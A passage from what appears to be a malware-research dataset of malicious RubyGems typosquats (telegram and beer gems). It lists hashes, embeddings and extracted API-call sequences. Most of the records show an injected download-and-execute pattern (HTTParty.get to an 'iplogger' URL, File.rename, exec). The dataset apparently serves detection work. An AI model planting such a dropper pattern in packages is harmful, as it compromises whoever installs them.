'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'Array.[]', 'attribute', 'attribute', 'attribute', 'hsh.[](:keyboard).map!', 'hsh.[]', 'arr.map', 'item.is_a?', 'item.to_compact_hash', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Hash.[](*attributes.find { |k, v|\\n  k != :update_id && v\\n}).values.first', 'Hash.[](*attributes.find { |k, v|\\n  k != :update_id && v\\n}).values', 'Hash.[]', 'attributes.find', 'attributes', 'k.!=', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', '\"0.12.0\".freeze']",
            "n_tokens": 3826,
            "embedding": "[-0.00996832 -0.02773374 -0.0154977  ...  0.00253309 -0.02248421\n  0.01889445]",
            "cluster": "0",
            "id": 401,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram_bot-ruby/0.12.0/telegram_bot-ruby-0.12.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram_bot-ruby/0.12.0/telegram_bot-ruby-0.12.0_extracted",
            "name": "telegram_bot-ruby",
            "version": "0.12.0",
            "published_at": "2020-02-25T03:02:22.210Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "rake, pry, rubocop, rspec, rubocop-rspec, faraday, virtus, inflecto",
            "SHA-256": "6d8e0b2a56f7e5a91afe39dd0d2ce7a86be445eeac2f63a72d27026e367aafb8"
        },
        {
            "name_version": "telegram_bot-types-0.6.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram_bot-types/0.6.1/telegram_bot-types-0.6.1_extracted/telegram_bot-types-0.6.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'module_function', 'str.gsub', '$2.capitalize', '[\"animation\", \"audio\", \"base\", \"callback_game\", \"callback_query\", \"chat\", \"chat_member\", \"chat_photo\", \"chosen_inline_result\", \"contact\", \"document\", \"file\", \"force_reply\", \"game\", \"game_high_score\", \"inline_keyboard_button\", \"inline_keyboard_markup\", \"inline_query\", \"inline_query_result_article\", \"inline_query_result_audio\", \"inline_query_result_cached_audio\", \"inline_query_result_cached_document\", \"inline_query_result_cached_gif\", \"inline_query_result_cached_mpeg4_gif\", \"inline_query_result_cached_photo\", \"inline_query_result_cached_sticker\", \"inline_query_result_cached_video\", \"inline_query_result_cached_voice\", \"inline_query_result_contact\", \"inline_query_result_document\", \"inline_query_result_game\", \"inline_query_result_gif\", \"inline_query_result_location\", \"inline_query_result_mpeg4_gif\", \"inline_query_result_photo\", \"inline_query_result_venue\", \"inline_query_result_video\", \"inline_query_result_voice\", \"input_contact_message_content\", \"input_location_message_content\", \"input_message_content\", \"input_text_message_content\", \"input_venue_message_content\", \"invoice\", \"keyboard_button\", \"labeled_price\", \"location\", \"mask_position\", \"message\", \"message_entity\", \"order_info\", \"photo_size\", \"pre_checkout_query\", \"reply_keyboard_markup\", \"reply_keyboard_remove\", \"response\", \"shipping_address\", \"shipping_option\", \"shipping_query\", \"sticker\", \"sticker_set\", \"successful_payment\", \"update\", \"user\", \"user_profile_photos\", \"venue\", \"video\", \"video_note\", \"voice\", \"webhook_info\"].each', 'autoload', 'camelize', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'require', 'include', 'Virtus.model', 'super.reject', 'v.nil?', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'alias_method', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'alias_method', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'alias_method', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'module_function', '{ getUpdates: [Update], getWebhookInfo: WebhookInfo, getMe: User, sendMessage: Message, forwardMessage: Message, sendPhoto: Message, sendAudio: Message, sendDocument: Message, sendVideo: Message, sendVoice: Message, sendVideoNote: Message, sendMediaGroup: Message, sendLocation: Message, editMessageLiveLocation: Message, stopMessageLiveLocation: Message, sendVenue: Message, sendContact: Message, getUserProfilePhotos: UserProfilePhotos, getFile: File, getChat: Chat, getChatAdministrators: [ChatMember], getChatMember: ChatMember, editMessageText: Message, editMessageCaption: Message, editMessageReplyMarkup: Message, sendSticker: Message, getStickerSet: StickerSet, uploadStickerFile: File, sendInvoice: Message, sendGame: Message, setGameScore: Message, getGameHighScores: [GameHighScore] }.freeze', 'object.==', 'type.is_a?', 'type.first', 'object.map', 'type.new', 'type.new', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', '\"0.6.1\".freeze', 'Gem::Version.new', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute']",
            "n_tokens": 2041,
            "embedding": "[-0.01520985 -0.00743474 -0.01166996 ...  0.00242273 -0.01968333\n  0.0151515 ]",
            "cluster": "0",
            "id": 484,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram_bot-types/0.6.1/telegram_bot-types-0.6.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram_bot-types/0.6.1/telegram_bot-types-0.6.1_extracted",
            "name": "telegram_bot-types",
            "version": "0.6.1",
            "published_at": "2020-02-25T03:02:44.885Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, rspec-its, pry, rubocop, virtus",
            "SHA-256": "35cb74ed0054ce87c891d5c7776ad60c1979a232b8b7641cf6f8304c1072e632"
        },
        {
            "name_version": "telegram-bot_ruby-0.1.7",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram-bot_ruby/0.1.7/telegram-bot_ruby-0.1.7_extracted/telegram-bot_ruby-0.1.7_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'include', 'include', 'include', 'attr_accessor', 'PollListener.new', 'warn', '@history.<<', '@history.last', '@listener.start!', '@listener.stop!', 'require_relative', 'Struct.new', 'include', 'parse', 'new', 'warn', 'new', 'parse_attrs', 'parse_extra_types', 'private', 'hash_key_aliases', 'members.map', 'members', 'aliases.include?', 'aliases.[]', 'hsh.[]', 'hsh.[]', 'hash_attr.to_s', 'extra_types.each', 'extra_types', 'obj.[]=', 'typ.from', 'obj.[]', 'obj.[](attr).nil?', 'obj.[]', 'obj.[]=', 'obj.[](attr).map', 'obj.[]', 'typ.[](0).from', 'typ.[]', 'warn', 'clazz.extend', 'require_relative', 'Struct.new', 'include', 'TelegramBot::Chat.new', 'id.has_key?', 'TelegramBot::GroupChat.from', 'id.has_key?', 'TelegramBot::User.from', 'TelegramBot::Chat.from', 'id.[]', 'require_relative', 'Struct.new', 'include', 'require_relative', 'require', 'include', 'new', 'new', 'Time.at(date).to_datetime', 'Time.at', 'new', 'Datetime.parse', 'attr_accessor', 'self.class.members', 'self.class', '@datetime.send', 'require_relative', 'Struct.new', 'include', 'require_relative', 'Struct.new', 'include', 'require_relative', 'Struct.new', 'include', 'require', 'require', 'require_relative', 'require_relative', 'attr_accessor', '@matcher.===', '@matcher.arguments', 'attr_accessor', 'clazz.prepend', '\"telegram_bot/#{type}_matcher\".classify', 'matcher_class_name.constantize', 'matcher_class.new', 'Handler.new', '@handlers.<<', '@handlers.each', 'hndlr.===', 'MessageProxy.new', 'proxy.instance_exec', 'hndlr.arguments', 'hndlr.action', 'hndlr.pass?', 'require_relative', 'Struct.new', 'include', 'new', 'attr_accessor', 'msg.type.==', 'msg.type', '@pattern.nil?', '@pattern.===', 'msg.text', 'Regexp.===', '@pattern.match', 'msg.text', 'md.to_a', 'msg.text', 'attr_accessor', '@command.nil?.!', '@command.nil?', '@command.to_s', 'msg.type.!=', 'msg.type', 'msg.text.start_with?(start_with).!', 'msg.text.start_with?', 'msg.text', 'msg.text.parition', 'msg.text', 'cmd.[]', '@comamnd.nil?', 'msg.text.split', 'msg.text', 'cmd.[]', 'msg.text.split', 'msg.text', 'require_relative', 'require', 'Struct.new', 'include', 'text', 'photo', 'audio', 'document', 'sticker', 'video', 'contact', 'location', 'new_chat_participant', 'left_chat_participant', 'new_chat_title', 'new_chat_photo', 'delete_chat_photo', 'group_chat_created', '!forward_from.!', 'forward_from.!', 'forward_from', '!reply_to_message.!', 'reply_to_message.!', 'reply_to_message', 'require', 'require_relative', 'extend', 'attr_accessor', 'include', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'Struct.new', 'include', '@client.append_history', '@client.handle', 'loop', 'get_updates.each', 'get_updates', 'message_received', 'update.message', 'update.id.+', 'update.id', 'save_offset', 'sleep', '@client.get_updates', '@client.get_updates', 'Struct.new', 'include', 'Struct.new', 'include', 'require', 'require', 'require', 'attr_accessor', 'clazz.prepend', 'construct_url', 'RestClient.post', 'JSON.parse', 'resp.body', 'json.[]', 'resp.code.to_s.=~', 'resp.code.to_s', 'resp.code', 'raise', 'Exception.new', 'private', 'method.to_s.camelize', 'method.to_s', '{ offset: offset, limit: limit, timouet: timeout }.reject', 'v.nil?', 'request(:get_updates, params).map', 'request', 'Update.from', 'User.from', 'request', 'Message.from', '{ chat_id: Chat.from(chat).id, text: text, disable_web_page_preview: disable_web_page_preview, reply_to_message_id: reply_to && reply_to.id, reply_markup: if reply_markup\\n  reply_markup.to_json\\nelse\\n  nil\\nend }.reject', 'Chat.from(chat).id', 'Chat.from', 'reply_to.id', 'reply_markup.to_json', 'v.nil?', 'Message.from', 'request', 'from.nil?', 'msg.chat', 'Chat.from', 'Chat.from(chat).id', 'Chat.from', 'chat', 'from_chat.id', 'Message.from(msg).id', 'Message.from', 'Message.from', 'request', 'CHAT_ACTIONS.include?', 'action.intern', 'warn', '\"invalid chat action #{action}, available actions are\".+', 'CHAT_ACTIONS.join', 'CHAT_ACTIONS.first', 'Chat.from(chat).id', 'Chat.from', 'action.to_s', 'request', 'private', 'self.method(__callee__).source_location', 'self.method', '__callee__', 'warn', 'defn_at.[]', '__callee__', 'public', 'METHODS.each', 'self.instance_methods(false).include?', 'self.instance_methods', 'alias_method', 'alias_method', 'message.chat', 'message', 'bot.send_message', 'bot', 'message.chat', 'message', 'bot.send_message', 'bot', 'message', 'bot.forward_message', 'bot', 'message', 'bot.send_chat_action', 'bot', 'message.chat', 'message', 'require_relative', 'Struct.new', 'include', 'require_relative', 'Struct.new', 'include', 'require_relative', 'Struct.new', 'include', 'require_relative', 'Struct.new', 'include']",
            "n_tokens": 1457,
            "embedding": "[-0.00015268 -0.0320344   0.00140743 ... -0.00226752 -0.0266511\n  0.02672692]",
            "cluster": "0",
            "id": 467,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram-bot_ruby/0.1.7/telegram-bot_ruby-0.1.7.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram-bot_ruby/0.1.7/telegram-bot_ruby-0.1.7_extracted",
            "name": "telegram-bot_ruby",
            "version": "0.1.7",
            "published_at": "2020-02-25T03:06:14.699Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rest-client, activesupport",
            "SHA-256": "2b83ab5a21572dfef87c5147b855563cea32124d7db2100dfc0c8a4d784743bc"
        },
        {
            "name_version": "telegram-notifications-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram-notifications/0.0.1/telegram-notifications-0.0.1_extracted/telegram-notifications-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['Rails.application.routes.draw', 'Rails.application.routes', 'Rails.application', 'post', 'require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'include', 'desc', 'Rails::Generators.options.[](:rails).[]', 'Rails::Generators.options.[]', 'Rails::Generators.options', 'File.join', 'File.dirname', 'orm.class.eql?', 'orm.class', 'orm', 'orm.to_s', 'orm', '[:active_record].include?', 'orm', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', 'self.class.orm_has_migration?', 'self.class', 'migration_template', 'copy_file', 'copy_file', 'copy_file', 'create_table', 't.integer', 't.string', 't.string', 't.string', 't.timestamps', 'add_index', 'drop_table', 'params.[]', 'params', 'TelegramUser.create', 'params.[](:message).[](:from).[]', 'params.[](:message).[]', 'params.[]', 'params', 'params.[](:message).[](:from).[]', 'params.[](:message).[]', 'params.[]', 'params', 'params.[](:message).[](:from).[]', 'params.[](:message).[]', 'params.[]', 'params', 'user.send_message', 'render', 'TelegramNotifications::TelegramUser.configure_production_url', 'TelegramNotifications::TelegramUser.configure_development_url', 'TelegramNotifications::TelegramUser.configure_token', 'validates_presence_of', 'validates_uniqueness_of', 'Rails.env.production?', 'Rails.env', 'token.=~', '\"https://api.telegram.org/bot\" + token.+', '\"https://api.telegram.org/bot\".+', 'active_url + \"/\".+', 'active_url.+', 'active_url', 'RestClient.post', '@@url.+', 'raise', 'TelegramNotifications::TelegramUser.all.each', 'TelegramNotifications::TelegramUser.all', 'user.send_message(text).!', 'user.send_message', 'JSON.parse', 'RestClient.post', '@@url.+', 'self.telegram_id', 'response.[]', 'require', '$LOAD_PATH.unshift', 'File.dirname', 'require', 'require', 'params.[]', 'params', 'TelegramUser.create', 'params.[](:message).[](:from).[]', 'params.[](:message).[]', 'params.[]', 'params', 'params.[](:message).[](:from).[]', 'params.[](:message).[]', 'params.[]', 'params', 'user.send_message', 'render', 'validates_presence_of', 'validates_uniqueness_of', 'Rails.env.production?', 'Rails.env', 'token.=~', '\"https://api.telegram.org/bot\" + token.+', '\"https://api.telegram.org/bot\".+', 'active_url + \"/\".+', 'active_url.+', 'active_url', 'RestClient.post', '@@url.+', 'raise', 'TelegramNotifications::TelegramUser.all.each', 'TelegramNotifications::TelegramUser.all', 'user.send_message(text).!', 'user.send_message', 'JSON.parse', 'RestClient.post', '@@url.+', 'self.telegram_id', 'response.[]']",
            "n_tokens": 763,
            "embedding": "[-0.02572863 -0.00593095 -0.0041497  ...  0.00276401 -0.01785673\n  0.01938001]",
            "cluster": "0",
            "id": 347,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram-notifications/0.0.1/telegram-notifications-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram-notifications/0.0.1/telegram-notifications-0.0.1_extracted",
            "name": "telegram-notifications",
            "version": "0.0.1",
            "published_at": "2020-02-25T03:07:19.890Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake",
            "SHA-256": "008714be39eda1935c1d5757b7dc74326e4f31ff53a90fc4126cb6c8ad298ad8"
        },
        {
            "name_version": "beer-bash-0.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/beer-bash/0.1.0/beer-bash-0.1.0_extracted/beer-bash-0.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'BeerMenus::Place.search', 'choose_place', 'raise', 'print', 'private', 'places.size.==', 'places.size', 'places.first', 'places.size.>', 'places.size', 'choose', 'place.on_tap', 'Terminal::Table.new', 't.title=', 'format_date', 'tap_list.updated_at', 't.headings=', 't.rows=', 'tap_list.taps.collect', 'tap_list.taps', 'beer.name', 'beer.abv', 'beer.format', 'beer.price', '(1..3)\\n.each', 't.align_column', 'puts', '(Date.today - date)\\n.to_i', 'Date.today.-', 'Date.today', 'date.strftime', 'Scraper.new.places', 'Scraper.new', 'attr_reader', 'Scraper.new.taps', 'Scraper.new', 'path', 'name', 'Struct.new', 'Struct.new', 'format.=~', 'format', 'scrape', 'places_url', 'page.links_with', 'links.collect', 'Place.new', 'link.to_s', 'link.href', 'scrape', 'taps_url', 'TapList.new', 'find_updated', 'find_taps', 'private', 'Mechanize.new', 'agent.get', 'agent', 'URI.escape', 'URI.escape', 'page.search(\"//div[contains(@class,\\\\\"content\\\\\")]/p[contains(text(),\\\\\"Updated: \\\\\")]\").first.text.strip.match(/Updated: (.*)/).[]', 'page.search(\"//div[contains(@class,\\\\\"content\\\\\")]/p[contains(text(),\\\\\"Updated: \\\\\")]\").first.text.strip.match', 'page.search(\"//div[contains(@class,\\\\\"content\\\\\")]/p[contains(text(),\\\\\"Updated: \\\\\")]\").first.text.strip', 'page.search(\"//div[contains(@class,\\\\\"content\\\\\")]/p[contains(text(),\\\\\"Updated: \\\\\")]\").first.text', 'page.search(\"//div[contains(@class,\\\\\"content\\\\\")]/p[contains(text(),\\\\\"Updated: \\\\\")]\").first', 'page.search', 'Date.strptime', 'page.search(\"//table[contains(@class,\\\\\"beermenu\\\\\")]/tbody/tr\").each_with_object', 'page.search', 'row.element_children.size.==', 'row.element_children.size', 'row.element_children', 'row.at(\"td[1]\").text.strip', 'row.at(\"td[1]\").text', 'row.at', 'row.at(\"td[2]\").text.strip', 'row.at(\"td[2]\").text', 'row.at', 'row.at(\"td[3]\").text.strip', 'row.at(\"td[3]\").text', 'row.at', 'row.at(\"td[4]\").text.strip', 'row.at(\"td[4]\").text', 'row.at', 'Beer.new', 'beer.on_tap?', 'beers.<<']",
            "n_tokens": 694,
            "embedding": "[ 0.01794881 -0.01132966 -0.00408291 ... -0.00479748 -0.02611933\n  0.02186953]",
            "cluster": "0",
            "id": 214,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/beer-bash/0.1.0/beer-bash-0.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/beer-bash/0.1.0/beer-bash-0.1.0_extracted",
            "name": "beer-bash",
            "version": "0.1.0",
            "published_at": "2020-02-25T03:15:21.091Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "rake, commander, mechanize, terminal-table",
            "SHA-256": "a1393e31e95543c60f800825405b3ae4e809eb583325e50eb916af9684026d71"
        },
        {
            "name_version": "beer-in_the_evening-0.0.7",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/beer-in_the_evening/0.0.7/beer-in_the_evening-0.0.7_extracted/beer-in_the_evening-0.0.7_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'STDOUT.sync=', 'Logger.new', 'BeerInTheEvening::Search.new', 'search.tube_station=', 'search.maximum_results=', 'search.minimum_rating=', 'search.real_ale=', 'search.wifi=', 'search.food=', 'search.each', 'puts', 'pub.to_s', 'require', 'require', 'STDOUT.sync=', 'Logger.new', 'BeerInTheEvening::Search.new', 'search.postcode=', 'search.maximum_results=', 'search.minimum_rating=', 'search.wifi=', 'search.each', 'puts', 'pub.to_s', 'require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'private', 'self.data=', 'distance.nil?.!', 'distance.nil?', 'distance', 'data.css(\"td b a:first-child\").[](0).inner_text.to_s.strip', 'data.css(\"td b a:first-child\").[](0).inner_text.to_s', 'data.css(\"td b a:first-child\").[](0).inner_text', 'data.css(\"td b a:first-child\").[]', 'data.css', 'data', '\"http://beerintheevening.com\".+', 'self.data.css(\"td b a:first-child\").[](0).[](\"href\").to_s', 'self.data.css(\"td b a:first-child\").[](0).[]', 'self.data.css(\"td b a:first-child\").[]', 'self.data.css', 'self.data', 'distance_known?', 'data.css(\"td:nth-child(#{rating_column})\").[](0).inner_text.scan', 'data.css(\"td:nth-child(#{rating_column})\").[](0).inner_text', 'data.css(\"td:nth-child(#{rating_column})\").[]', 'data.css', 'data', 